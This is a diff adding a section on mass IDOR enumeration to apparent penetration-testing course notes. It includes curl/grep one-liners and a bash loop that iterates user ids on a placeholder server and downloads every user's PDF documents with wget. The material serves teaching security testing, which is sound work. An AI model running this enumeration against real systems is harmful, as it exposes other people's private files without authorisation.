@@ -191,3 +191,49 @@ echo "<a href='" . $row['url'] . "' target='_blank'></a>";
 ```
 
 - Strong object referencing is always the second step after implementing a strong access control system. Furthermore, some of the techniques would work even with unique references if the access control system is broken, like repeating one user's request with another user's session.
+
+##### Mass IDOR Enumeration
+
+- Insecure Parameters: Static file IDOR is when the parameter we are testing has a predictable pattern. For example: 
+```
+/documents/Invoice_1_09_2021.pdf
+/documents/Report_1_10_2021.pdf
+```
+
+- The number `1` in the example above is the `uid` of a user. We could change the `uid` and check if we can get the information of another user.
+- Mass Enumeration: For the example above we could use fuzzing(`Burp Intruder`or `ZAP Fuzzer`) to test the files for other users.
+- For the file links we could also inspect the element in the browser.
+```html
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+- We may `curl` the page and `grep` for this line `<li class='pure-tree_link'>`
+```
+curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"`
+
+
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+- We can use regex to just get the file patterns
+```
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+```
+
+- We can use a bash script to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
+```
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
